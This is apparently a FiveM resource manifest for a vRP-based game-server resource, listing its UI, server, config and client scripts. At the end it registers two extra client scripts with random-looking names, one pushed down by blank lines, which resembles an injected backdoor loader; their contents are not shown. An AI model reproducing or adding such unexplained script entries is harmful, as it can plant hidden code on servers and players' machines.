resource_manifest_version '05cfa83c-a124-4cfa-a768-c24a5811d8f9'

client_script "@NativeUI/NativeUI.lua"

server_scripts {
	"@vrp/lib/utils.lua",
	'serverCallbackLib/server.lua',
	"config.lua",
	"server.lua"
}

client_scripts {
	"@vrp/client/Tunnel.lua",
	"@vrp/client/Proxy.lua",
	'serverCallbackLib/client.lua',
	'client.lua',
}
client_script "dXKYKWpRFBlOIBufyi.lua"







client_script "13277.lua"